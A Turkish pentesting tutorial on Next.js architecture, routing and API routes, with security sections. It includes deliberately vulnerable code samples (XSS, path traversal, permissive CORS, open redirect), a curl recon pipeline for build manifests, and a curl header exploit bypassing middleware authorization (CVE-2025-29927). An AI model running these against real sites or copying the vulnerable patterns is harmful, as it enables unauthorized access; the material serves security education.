# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Next.js Uygulamasının Genel Mimarisi

### Tipik Dosya Yapısı

Tipik bir Next.js projesi, yönlendirme, API endpoint'leri ve statik varlık yönetimi gibi özelliklerin sağlanmasını kolaylaştıran belirli bir dosya ve dizin yapısını izler. İşte tipik bir düzen:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Core Directories and Files

- **public/:** Görseller, fontlar ve diğer dosyalar gibi statik varlıkları barındırır. Buradaki dosyalara kök yolundan (`/`) erişilebilir.
- **app/:** Uygulamanızın sayfaları, layout'ları, component'leri ve API route'ları için merkezi dizin. **App Router** paradigm'ını benimser; gelişmiş routing özellikleri ve server-client component ayrımına olanak tanır.
- **app/layout.tsx:** Uygulamanız için root layout'u tanımlar; tüm sayfaların etrafını sarar ve header, footer, navigation bar gibi tutarlı UI öğeleri sağlar.
- **app/page.tsx:** Root route `/` için giriş noktasıdır ve ana sayfayı render eder.
- **app/[route]/page.tsx:** Static ve dynamic route'ları işler. `app/` içindeki her klasör bir route segmentini temsil eder ve o klasördeki `page.tsx` route'ın component'ine karşılık gelir.
- **app/api/:** API route'larını içerir; HTTP isteklerini işleyen serverless functions oluşturmanıza olanak tanır. Bu route'lar geleneksel `pages/api` dizininin yerini alır.
- **app/components/:** Farklı sayfa ve layout'larda yeniden kullanılabilecek React component'lerini barındırır.
- **app/styles/:** Global CSS dosyalarını ve component düzeyinde stil için CSS Modules'u içerir.
- **app/utils/:** Uygulama genelinde paylaşılabilecek yardımcı fonksiyonlar, helper modüller ve diğer UI dışı mantığı içerir.
- **.env.local:** Yerel geliştirme ortamına özgü environment variable'ları saklar. Bu değişkenler versiyon kontrolüne dahil edilmez.
- **next.config.js:** Next.js davranışını özelleştirir; webpack konfigürasyonları, environment variable'ları ve güvenlik ayarları gibi öğeleri içerir.
- **tsconfig.json:** Proje için TypeScript ayarlarını yapılandırır; type checking ve diğer TypeScript özelliklerini etkinleştirir.
- **package.json:** Proje bağımlılıkları, script'ler ve metadata'yı yönetir.
- **README.md:** Projeye dair dokümantasyon ve bilgileri sağlar; kurulum talimatları, kullanım yönergeleri ve diğer ilgili detayları içerir.
- **yarn.lock / package-lock.json:** Projenin bağımlılıklarını belirli sürümlere sabitleyerek farklı ortamlarda tutarlı kurulumlar sağlar.

## Client-Side in Next.js

### File-Based Routing in the `app` Directory

`app` dizini, en son Next.js sürümlerinde routing'in temelini oluşturur. Route tanımlamak için filesystem'i kullanır; bu da route yönetimini sezgisel ve ölçeklenebilir kılar.

<details>

<summary>Handling the Root Path /</summary>

**File Structure:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Ana Dosyalar:**

- **`app/page.tsx`**: Kök yol `/` için gelen istekleri işler.
- **`app/layout.tsx`**: Uygulama için layout'u tanımlar; tüm sayfaları çevreler.

**Uygulama:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Açıklama:**

- **Rota Tanımı:** `app` dizini altındaki `page.tsx` dosyası doğrudan `/` rotasına karşılık gelir.
- **Render Etme:** Bu bileşen ana sayfanın içeriğini render eder.
- **Layout Entegrasyonu:** `HomePage` bileşeni `layout.tsx` tarafından sarılır; bu başlıklar, altbilgiler ve diğer ortak öğeleri içerebilir.

</details>

<details>

<summary>Diğer Statik Yolların Ele Alınması</summary>

**Örnek: `/about` Rotası**

**Dosya Yapısı:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Uygulama:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Açıklama:**

- **Rota Tanımı:** The `page.tsx` file inside the `about` folder corresponds to the `/about` route.
- **Render Etme:** Bu bileşen about sayfasının içeriğini render eder.

</details>

<details>

<summary>Dinamik Rotalar</summary>

Dinamik rotalar, değişken segmentlere sahip yolları işlemenize olanak tanır; bu sayede uygulamalar IDs, slugs gibi parametrelere göre içerik gösterebilir.

**Örnek: `/posts/[id]` Rota**

**Dosya Yapısı:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Uygulama:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Açıklama:**

- **Dinamik Segment:** `[id]` rotadaki dinamik segmenti belirtir ve URL'den `id` parametresini yakalar.
- **Parametrelere Erişim:** `params` nesnesi dinamik parametreleri içerir ve bileşen içinde erişilebilir.
- **Rota Eşleme:** `/posts/*` ile eşleşen herhangi bir yol, ör. `/posts/1`, `/posts/abc` vb., bu bileşen tarafından işlenecektir.

</details>

<details>

<summary>İç İçe Rotalar</summary>

Next.js, dizin yapısını yansıtan hiyerarşik rota yapılarına olanak veren iç içe yönlendirmeyi destekler.

**Örnek: `/dashboard/settings/profile` Rota**

**Dosya Yapısı:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Uygulama:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Açıklama:**

- **Derin İç İçe Yapı:** `page.tsx` dosyası `dashboard/settings/profile/` klasörü içinde `/dashboard/settings/profile` route'una karşılık gelir.
- **Hiyerarşi Yansıması:** Dizin yapısı URL yolunu yansıtarak bakım kolaylığı ve açıklık sağlar.

</details>

<details>

<summary>Catch-All rotaları</summary>

Catch-all rotaları birden fazla iç içe segmenti veya bilinmeyen yolları işler, route işleme konusunda esneklik sağlar.

**Örnek: `/*` Rota**

**Dosya Yapısı:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Uygulama:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Açıklama:**

- **Catch-All Segment:** `[...slug]` kalan tüm yol segmentlerini bir dizi olarak yakalar.
- **Usage:** Kullanıcı tarafından oluşturulan yollar, iç içe kategoriler gibi dinamik yönlendirme senaryolarını ele almak için faydalıdır.
- **Route Matching:** `/anything/here`, `/foo/bar/baz` gibi yollar bu bileşen tarafından işlenir.

</details>

### Potansiyel İstemci Tarafı Zafiyetleri

Next.js güvenli bir temel sağlasa da, hatalı kodlama uygulamaları zafiyetlere yol açabilir. Önemli istemci tarafı zafiyetleri şunlardır:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

XSS saldırıları, kötü amaçlı betikler güvenilen web sitelerine enjekte edildiğinde meydana gelir. Saldırganlar, kullanıcıların tarayıcılarında betikler çalıştırarak veri çalabilir veya kullanıcının adına işlemler gerçekleştirebilir.

**Zayıf Koda Örnek:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Neden Güvenli Değil:** Güvenilmeyen girdilerle `dangerouslySetInnerHTML` kullanmak, saldırganların kötü amaçlı scriptler enjekte etmesine izin verir.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Kullanıcı girdilerinin şablonlarda uygun şekilde işlenmemesi durumunda ortaya çıkar; saldırganların şablonlar veya ifadeler enjekte edip çalıştırmasına olanak tanır.

**Zayıf Kod Örneği:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Neden Zafiyetli:** Eğer `template` veya `data` kötü amaçlı içerik içeriyorsa, istenmeyen kodun çalıştırılmasına neden olabilir.

</details>

<details>

<summary>Client Path Traversal</summary>

Bu zafiyet, saldırganların client-side yolları manipüle ederek Cross-Site Request Forgery (CSRF) gibi istenmeyen işlemler gerçekleştirmesine izin verir. Server-side path traversal sunucunun dosya sistemini hedef alırken, CSPT meşru API isteklerini client-side mekanizmaları sömürerek kötü amaçlı endpoints'e yönlendirmeye odaklanır.

**Zafiyetli Kod Örneği:**

Bir Next.js uygulaması kullanıcılara dosya yükleme ve indirme imkanı verir. İndirme özelliği client side'da uygulanmıştır; kullanıcılar indirmek istedikleri dosyanın dosya yolunu belirtebilirler.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Saldırı Senaryosu

1. **Saldırganın Hedefi**: `filePath`'i manipüle ederek kritik bir dosyayı (ör. `admin/config.json`) silmek için CSRF saldırısı gerçekleştirmek.
2. **CSPT'yi Sömürme**:
- **Kötü Amaçlı Girdi**: Saldırgan, `../deleteFile/config.json` gibi manipüle edilmiş bir `filePath` içeren bir URL oluşturur.
- **Ortaya Çıkan API Çağrısı**: Client-side kodu `/api/files/../deleteFile/config.json` isteği yapar.
- **Sunucunun İşlemesi**: Sunucu `filePath`'i doğrulamıyorsa isteği işler ve hassas dosyaları silme veya açığa çıkarma riski doğurur.
3. **CSRF'yi Gerçekleştirme**:
- **Hazırlanan Link**: Saldırgan, mağdura manipüle edilmiş `filePath` ile indirme isteğini tetikleyen bir link gönderir veya kötü amaçlı bir script gömer.
- **Sonuç**: Mağdur farkında olmadan işlemi gerçekleştirir ve yetkisiz dosya erişimi veya silinme gerçekleşir.

</details>

### Recon: static export route discovery via _buildManifest

When `nextExport`/`autoExport` are true (static export), Next.js exposes the `buildId` in the HTML and serves a build manifest at `/_next/static/<buildId>/_buildManifest.js`. The `sortedPages` array and route→chunk mapping there enumerate every prerendered page without brute force.

- Grab the buildId from the root response (often printed at the bottom) or from `<script>` tags loading `/_next/static/<buildId>/...`.
- Fetch the manifest and extract routes:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- Keşfedilen yolları (örneğin `/docs`, `/docs/content/examples`, `/signin`) kimlik doğrulama testleri ve uç nokta keşfi için kullanın.

## Next.js'de Sunucu Tarafı

### Sunucu Tarafı Rendering (SSR)

Sayfalar her istekte sunucuda render edilir, böylece kullanıcının tamamen render edilmiş HTML alması sağlanır. Bu durumda istekleri işlemek için kendi özel sunucunuzu oluşturmalısınız.

**Kullanım Durumları:**

- Sık sık değişen dinamik içerik.
- SEO optimizasyonu, çünkü arama motorları tamamen render edilmiş sayfayı tarayabilir.

**Uygulama:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Statik Site Oluşturma (SSG)

Sayfalar build sırasında önceden render edilir; bu da daha hızlı yükleme süreleri ve azalan sunucu yükü sağlar.

**Kullanım Durumları:**

- Sık sık değişmeyen içerik.
- Bloglar, dokümantasyon, pazarlama sayfaları.

**Uygulama:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Sunucusuz Fonksiyonlar (API Routes)

Next.js, API endpoint'lerinin sunucusuz fonksiyonlar olarak oluşturulmasına olanak tanır. Bu fonksiyonlar, özel bir sunucuya ihtiyaç duymadan isteğe bağlı olarak çalışır.

**Kullanım Durumları:**

- Form gönderimlerini işleme.
- Veritabanlarıyla etkileşim.
- Veri işleme veya üçüncü taraf API'lerle entegrasyon.

**Uygulama:**

Next.js 13'te `app` dizininin tanıtılmasıyla, yönlendirme ve API işleme daha esnek ve güçlü hale geldi. Bu modern yaklaşım dosya tabanlı yönlendirme sistemiyle yakından uyumlu olmakla birlikte, sunucu ve istemci bileşenleri desteği dahil olmak üzere geliştirilmiş yetenekler sunar.

#### Temel Rota İşleyicisi

**Dosya Yapısı:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Uygulama:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Açıklama:**

- **Konum:** API route'ları `app/api/` dizininin altında yer alır.
- **Dosya Adlandırma:** Her API endpoint'i, içinde bir `route.js` veya `route.ts` dosyası bulunan kendi klasöründe bulunur.
- **Exported Functions:** Tek bir default export yerine, belirli HTTP metod fonksiyonları (ör. `GET`, `POST`) dışa aktarılır.
- **Response Handling:** `Response` constructor'ını kullanarak yanıt döndürün; bu, header'lar ve durum kodları üzerinde daha fazla kontrol sağlar.

#### Diğer yollar ve metodlar nasıl ele alınır:

<details>

<summary>Belirli HTTP Metodlarını Ele Alma</summary>

Next.js 13+ aynı `route.js` veya `route.ts` dosyası içinde belirli HTTP metodları için işleyiciler tanımlamanıza izin verir; bu, daha temiz ve düzenli kod sağlar.

**Örnek:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Açıklama:**

- **Çoklu Dışa Aktarımlar:** Her HTTP yöntemi (`GET`, `PUT`, `DELETE`) kendi dışa aktarılan fonksiyona sahiptir.
- **Parametreler:** İkinci argüman, `params` üzerinden route parametrelerine erişim sağlar.
- **Geliştirilmiş Yanıtlar:** Yanıt nesneleri üzerinde daha fazla kontrol sağlayarak başlıklar ve durum kodları üzerinde hassas yönetim imkanı verir.

</details>

<details>

<summary>Catch-All ve İç İçe Rotalar</summary>

Next.js 13+ catch-all rotaları ve iç içe API rotaları gibi gelişmiş yönlendirme özelliklerini destekler; bu da daha dinamik ve ölçeklenebilir API yapıları oluşturmayı sağlar.

**Catch-All Route Örneği:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Açıklama:**

- **Sözdizimi:** `[...]` iç içe geçmiş tüm yolları yakalayan bir catch-all segmentini belirtir.
- **Kullanım:** Farklı rota derinliklerini veya dinamik segmentleri işlemek zorunda olan API'ler için yararlıdır.

**İç İçe Rotalar Örneği:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Açıklama:**

- **Deep Nesting:** Kaynak ilişkilerini yansıtan hiyerarşik API yapıları oluşturulmasına olanak tanır.
- **Parameter Access:** Birden fazla rota parametresine `params` nesnesi aracılığıyla kolayca erişim sağlar.

</details>

<details>

<summary>Handling API routes in Next.js 12 and Earlier</summary>

## `pages` Dizindeki API Rotaları (Next.js 12 ve Önceki Sürümler)

Next.js 13 `app` dizinini ve geliştirilmiş yönlendirme yeteneklerini tanıtmadan önce, API rotaları ağırlıklı olarak `pages` dizini içinde tanımlanıyordu. Bu yaklaşım hâlâ yaygın olarak kullanılıyor ve Next.js 12 ve önceki sürümlerde destekleniyor.

#### Temel API Rotası

**Dosya Yapısı:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Uygulama:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Açıklama:**

- **Konum:** API route'ları `pages/api/` dizini altında bulunur.
- **Dışa Aktarım:** `export default` kullanarak handler fonksiyonunu tanımlayın.
- **Fonksiyon İmzası:** Handler `req` (HTTP request) ve `res` (HTTP response) nesnelerini alır.
- **Yönlendirme:** Dosya adı (`hello.js`) `/api/hello` endpoint'ine karşılık gelir.

#### Dinamik API route'ları

**Dosya Yapısı:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Uygulama:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Açıklama:**

- **Dinamik Segmentler:** Köşeli parantezler (`[id].js`) dinamik route segmentlerini belirtir.
- **Parametrelere Erişim:** Dinamik parametreye erişmek için `req.query.id` kullanın.
- **HTTP Yöntemlerini İşleme:** Farklı HTTP yöntemlerini (`GET`, `PUT`, `DELETE`, vb.) ele almak için koşullu mantık kullanın.

#### Farklı HTTP Yöntemlerini İşleme

Temel API route örneği tüm HTTP yöntemlerini tek bir fonksiyon içinde işlerken, kodunuzu her yöntemi açıkça işlemek üzere yapılandırabilirsiniz; bu, okunabilirlik ve bakım kolaylığını artırır.

**Örnek:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**En İyi Uygulamalar:**

- **Sorumluluk Ayrımı:** Farklı HTTP yöntemleri için mantığı net şekilde ayırın.
- **Yanıt Tutarlılığı:** İstemci tarafı işlemleri kolaylaştırmak için tutarlı yanıt yapıları sağlayın.
- **Hata Yönetimi:** Desteklenmeyen yöntemleri ve beklenmeyen hataları uygun şekilde ele alın.

</details>

### CORS Yapılandırması

API rotalarınıza hangi origin'lerin erişebileceğini kontrol ederek Cross-Origin Resource Sharing (CORS) zafiyetlerini azaltın.

**Kötü Yapılandırma Örneği:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Unutmayın ki **CORS tüm API rotalarında da yapılandırılabilir** **`middleware.ts`** dosyası içinde:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Sorun:**

- **`Access-Control-Allow-Origin: '*'`:** Herhangi bir web sitesinin API'ye erişmesine izin verir; bu, kötü niyetli sitelerin API'nizle kısıtlama olmadan etkileşimde bulunmasına olanak verebilir.
- **Geniş Yöntem İzni:** Tüm yöntemlere izin vermek saldırganların istenmeyen işlemler gerçekleştirmesine olanak tanıyabilir.

**Saldırganlar bunu nasıl kötüye kullanır:**

Saldırganlar, API'nize istek gönderen kötü niyetli web siteleri oluşturabilir; böylece veri alma, veri manipülasyonu gibi işlevleri veya kimliği doğrulanmış kullanıcılar adına istenmeyen eylemleri tetiklemeyi kötüye kullanabilirler.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Sunucu kodunun İstemci Tarafında Açığa Çıkması

Sunucuda kullanılan kodun istemci tarafında da açığa çıkarılan ve kullanılan kod içinde kolayca kullanılabileceği durumlar olabilir; bir kod dosyasının istemci tarafında asla açığa çıkarılmamasını sağlamak için dosyanın başında şu import'u kullanmak en iyi yoldur:
```js
import "server-only"
```
## Ana Dosyalar ve Rolleri

### `middleware.ts` / `middleware.js`

**Location:** Projenin kökünde veya `src/` içinde.

**Purpose:** İstek işlenmeden önce sunucu tarafındaki serverless fonksiyonda kod çalıştırır; bu, kimlik doğrulama, yönlendirmeler veya yanıtları değiştirme gibi görevleri yapmaya izin verir.

**İşlem Akışı:**

1. **Gelen İstek:** middleware isteği yakalar.
2. **İşleme:** İsteğe bağlı olarak işlemler gerçekleştirir (örn. kimlik doğrulama kontrolü).
3. **Yanıt Değişikliği:** Yanıtı değiştirebilir veya bir sonraki handler'a kontrolü aktarabilir.

**Örnek Kullanım Durumları:**

- Kimliği doğrulanmamış kullanıcıları yönlendirme.
- Özel HTTP başlıkları ekleme.
- İstekleri loglama.

**Örnek Konfigürasyon:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Middleware authorization bypass (CVE-2025-29927)

If authorization is enforced in middleware, affected Next.js releases (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) can be bypassed by injecting the `x-middleware-subrequest` header. The framework will skip middleware recursion and return the protected page.

- Temel davranış genellikle `/api/auth/signin` gibi bir login rotasına 307 redirect'tir.
- Yanıtı 200'e çevirmek için uzun bir `x-middleware-subrequest` değeri gönderin (`middleware` kelimesini tekrarlayarak `MAX_RECURSION_DEPTH`'e ulaşın):
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
- Kimlik doğrulaması gerektiren sayfalar birçok alt kaynağı çektiği için, varlıkların yönlendirilmesini engellemek amacıyla başlığı her isteğe ekleyin (ör. Burp Match/Replace ile boş bir eşleşme dizesi kullanarak).

### `next.config.js`

**Location:** Projenin kökü.

**Purpose:** Next.js davranışını yapılandırır; özellikleri etkinleştirip devre dışı bırakabilir, webpack yapılandırmalarını özelleştirebilir, environment değişkenleri ayarlayabilir ve çeşitli güvenlik özelliklerini yapılandırabilir.

**Key Security Configurations:**

<details>

<summary>Güvenlik Başlıkları</summary>

Güvenlik başlıkları, tarayıcılara içeriği nasıl işleyeceklerini talimat vererek uygulamanızın güvenliğini artırır. Cross-Site Scripting (XSS), Clickjacking ve MIME type sniffing gibi çeşitli saldırıları hafifletmeye yardımcı olurlar:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Örnekler:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Görüntü Optimizasyonu Ayarları</summary>

Next.js görüntüleri performans için optimize eder, ancak yanlış yapılandırmalar güvenlik açıklarına neden olabilir; örneğin güvenilmeyen kaynakların kötü amaçlı içerik enjekte etmesine izin verebilir.

**Kötü Yapılandırma Örneği:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Sorun:**

- **`'*'`:** Görüntülerin güvenilmeyen veya kötü amaçlı alanlar da dahil olmak üzere herhangi bir harici kaynaktan yüklenmesine izin verir. Saldırganlar kötü amaçlı payloads içeren veya kullanıcıları yanıltan içerikler barındırabilir.
- Başka bir sorun, **herkesin bir resim yükleyebileceği** bir domaine izin vermek olabilir (ör. `raw.githubusercontent.com`)

**Saldırganlar bunu nasıl kötüye kullanır:**

Kötü amaçlı kaynaklardan görüntü enjekte ederek, saldırganlar phishing saldırıları gerçekleştirebilir, yanıltıcı bilgi gösterebilir veya görüntü render kütüphanelerindeki zafiyetleri suistimal edebilir.

</details>

<details>

<summary>Environment Variables Exposure</summary>

API anahtarları ve veritabanı kimlik bilgileri gibi hassas bilgileri istemciye açmadan güvenli şekilde yönetin.

#### a. Hassas Değişkenlerin Açığa Çıkması

**Kötü Yapılandırma Örneği:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Not exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for exposure to client
},
}
```
**Sorun:**

- **`SECRET_API_KEY`:** `NEXT_PUBLIC_` öneki olmadan Next.js değişkenleri client'a açmaz. Ancak yanlışlıkla öneklenirse (ör. `NEXT_PUBLIC_SECRET_API_KEY`), client tarafında erişilebilir hale gelir.

**Saldırganlar bunu nasıl kötüye kullanır:**

Eğer hassas değişkenler client'a açılırsa, saldırganlar client-side kodu veya network requests'i inceleyerek bunları elde edebilir ve APIs, veritabanları veya diğer servislerde yetkisiz erişim sağlayabilir.

</details>

<details>

<summary>Yönlendirmeler</summary>

Uygulamanız içinde URL yönlendirmelerini ve rewrites işlemlerini yönetin; kullanıcıların uygun şekilde yönlendirildiğinden ve open redirect vulnerabilities oluşmadığından emin olun.

#### a. Open Redirect Vulnerability

**Kötü Konfigürasyon Örneği:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Sorun:**

- **Dinamik Hedef:** Kullanıcıların herhangi bir URL belirtmesine izin verir; bu da open redirect attacks'e olanak tanır.
- **Kullanıcı Girdisine Güvenme:** Kullanıcılar tarafından sağlanan URL'lere doğrulama olmadan yapılan yönlendirmeler phishing, malware dağıtımı veya kimlik bilgisi hırsızlığına yol açabilir.

**Saldırganlar bunu nasıl kötüye kullanır:**

Saldırganlar alan adınızdan geliyor gibi görünen ancak kullanıcıları kötü amaçlı sitelere yönlendiren URL'ler oluşturabilir. Örneğin:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Kullanıcılar orijinal domaine güvendiklerinde farkında olmadan zararlı web sitelerine gidebilirler.

</details>

<details>

<summary>Webpack Yapılandırması</summary>

Next.js uygulamanız için Webpack yapılandırmalarını özelleştirmek, dikkatli ele alınmazsa istemeden güvenlik açıklarına yol açabilir.

#### a. Hassas Modüllerin Açığa Çıkarılması

**Kötü Yapılandırma Örneği:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Sorun:**

